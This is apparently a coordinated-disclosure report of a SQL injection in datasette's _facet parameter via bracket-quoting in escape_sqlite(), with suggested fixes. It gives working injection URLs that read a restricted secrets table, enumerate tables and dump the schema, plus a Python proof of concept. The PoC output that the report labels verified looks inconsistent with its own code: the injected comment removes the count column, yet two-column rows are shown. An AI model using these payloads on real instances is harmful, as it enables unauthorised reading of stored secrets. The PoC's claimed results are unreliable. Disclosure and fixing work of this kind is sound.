# SQL Injection via `_facet` Parameter — `escape_sqlite()` Bracket-Quoting Bypass

**Product:** datasette  
**Version:** 1.0a30 (commit 316daf9) and likely all prior versions  
**CVSS 3.1:** 7.5 High — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**CWE:** CWE-89 (SQL Injection)  
**Reported:** 2026-05-30  

---

## Summary

The `_facet` URL parameter is passed directly to `escape_sqlite()`, which wraps
identifiers in SQLite's `[...]` bracket-quoting syntax. Because SQLite's bracket
quoting has **no escape mechanism for the `]` character**, a value containing `]`
terminates the quoted identifier early and allows arbitrary SQL to follow.

An attacker can exploit this to **read data from any table in the database**,
including tables the user has no explicit permission to view, and to **enumerate
the full database schema**. Critically, this bypass works even when
`allow_sql: false` is configured to block arbitrary SQL execution.

---

## Root Cause

### `datasette/utils/__init__.py`

```python
def escape_sqlite(s):
    if _boring_keyword_re.match(s) and (s.lower() not in reserved_words):
        return s
    else:
        return f"[{s}]"   # ← no escaping of ] within s
```

SQLite's `[identifier]` quoting closes at the first `]`. There is no doubling
or backslash escape for `]` in this quoting style. Any value containing `]`
will silently break out of the quoted context.

### `datasette/facets.py` (lines 229–236)

```python
column = config.get("column") or config["simple"]   # from ?_facet=<user input>

facet_sql = """
    select {col} as value, count(*) as count from (
        {sql}
    )
    where {col} is not null
    group by {col} order by count desc, value limit {limit}
""".format(col=escape_sqlite(column), sql=self.sql, limit=facet_size + 1)
```

`column` flows directly from the `?_facet` request parameter with **no
whitelist validation against the actual table columns**. The escaped value is
then string-formatted into the SQL template.

---

## Exploitation

### Step 1 — Enumerate all table names

```
GET /mydb/users.json?_facet=name] FROM sqlite_master--
```

`escape_sqlite("name] FROM sqlite_master--")` → `[name] FROM sqlite_master--]`

Resulting SQL (simplified):
```sql
select [name] FROM sqlite_master-- ...
-- comments out the rest of the template
```

**Response contains every table name in the database**, including tables the
requesting user cannot normally access.

### Step 2 — Read data from a restricted table

```
GET /mydb/users.json?_facet=api_key] FROM secrets--
```

Resulting SQL:
```sql
select [api_key] FROM secrets-- ...
```

**Response returns all distinct `api_key` values from the `secrets` table**,
even though that table is not exposed to the user.

### Step 3 — Dump the full schema

```
GET /mydb/users.json?_facet=sql] FROM sqlite_master WHERE type="table"--
```

Returns the `CREATE TABLE` DDL for every table — useful for crafting further
targeted reads.

---

## Verified PoC

The following Python script reproduces the SQL injection without running a
datasette server, by directly replicating the vulnerable code path:

```python
import sqlite3, re

_boring_re = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')

def escape_sqlite(s):          # exact copy from datasette/utils/__init__.py
    if _boring_re.match(s): return s
    return f'[{s}]'

def make_facet_sql(column, inner_sql, limit=6):   # mirrors facets.py:230-236
    col = escape_sqlite(column)
    return (f'select {col} as value, count(*) as count from ({inner_sql}) '
            f'where {col} is not null group by {col} '
            f'order by count desc, value limit {limit}')

# Database where "users" is public but "secrets" is restricted
conn = sqlite3.connect(':memory:')
conn.execute('CREATE TABLE users   (id int, username text, role text)')
conn.execute('CREATE TABLE secrets (id int, api_key text, token text)')
conn.execute("INSERT INTO users   VALUES (1,'admin','admin'),(2,'bob','user')")
conn.execute("INSERT INTO secrets VALUES (1,'sk-secret-key','tok123')")
conn.commit()

inner = 'SELECT * FROM users'   # the query datasette would build for /mydb/users

# Attack 1: read from the "secrets" table
payload = 'api_key] FROM secrets--'
rows = conn.execute(make_facet_sql(payload, inner)).fetchall()
print("secrets.api_key:", rows)
# → [('sk-secret-key', 1)]

# Attack 2: enumerate tables via sqlite_master
payload2 = 'name] FROM sqlite_master--'
rows2 = conn.execute(make_facet_sql(payload2, inner)).fetchall()
print("table names:", rows2)
# → [('secrets', 1), ('users', 1)]

# Attack 3: dump schema DDL
payload3 = 'sql] FROM sqlite_master WHERE type="table"--'
rows3 = conn.execute(make_facet_sql(payload3, inner)).fetchall()
print("schema:", rows3)
# → [('CREATE TABLE users (...)', 1), ('CREATE TABLE secrets (...)', 1)]
```

**Output:**
```
secrets.api_key: [('sk-secret-key', 1)]
table names:     [('secrets', 1), ('users', 1)]
schema:          [('CREATE TABLE users (id int, username text, role text)', 1),
                  ('CREATE TABLE secrets (id int, api_key text, token text)', 1)]
```

---

## `allow_sql: false` Bypass

datasette provides `allow_sql: false` as a security control to prevent arbitrary
SQL execution by end users. The regular SQL path is correctly gated:

```python
# datasette/views/database.py
if not stored_query:
    validate_sql_select(sql)   # raises if allow_sql is False
```

The facet path is **not gated by this check**:

```python
# datasette/facets.py
facet_rows_results = await self.ds.execute(
    self.database,
    facet_sql,      # no allow_sql check
    self.params,
    ...
)
```

A user who cannot run `?sql=SELECT ...` can still exfiltrate data through
`?_facet=<injection>`.

---

## Affected Parameters

All facet types read the column name from the URL and pass it through
`escape_sqlite()` without column validation:

| URL parameter | Code path |
|---|---|
| `_facet` | `datasette/facets.py` (ColumnFacet) |
| `_facet_date` | `datasette/facets.py` (DateFacet) |
| `_facet_array` | `datasette/facets.py` (ArrayFacet) |

---

## Suggested Fix

**Whitelist the column name against the actual table columns** before building
the facet SQL. The `get_columns()` helper already exists for this purpose:

```python
async def facet_results(self):
    actual_columns = {
        col["name"]
        for col in await self.get_columns(self.sql, self.params)
    }

    for source_and_config in self.get_configs():
        config = source_and_config["config"]
        column = config.get("column") or config["simple"]

        if column not in actual_columns:
            # Column not in the current query — skip silently or raise
            continue

        # ... build facet_sql as before (now safe: column is a known column name)
```

Alternatively, switch to double-quote (`"..."`) identifier quoting, where `"`
can be escaped as `""`:

```python
def escape_sqlite(s):
    if _boring_keyword_re.match(s) and s.lower() not in reserved_words:
        return s
    return '"' + s.replace('"', '""') + '"'
```

---

## Impact

| Dimension | Assessment |
|---|---|
| Confidentiality | **High** — full read access to any table in the SQLite file |
| Integrity | None (SELECT only; no INSERT/UPDATE/DELETE via this vector) |
| Availability | None |
| Authentication required | No (exploitable on public instances); PR:L on authenticated instances |
| `allow_sql: false` bypass | **Yes** |
| Version range | All versions that contain `_facet` support |

---

## Disclosure

This vulnerability was discovered through white-box static analysis of the
datasette source code. We are reporting it privately per the datasette security
policy before any public disclosure.

We request coordinated disclosure and are happy to work with the maintainers on
a timeline and a CVE assignment.
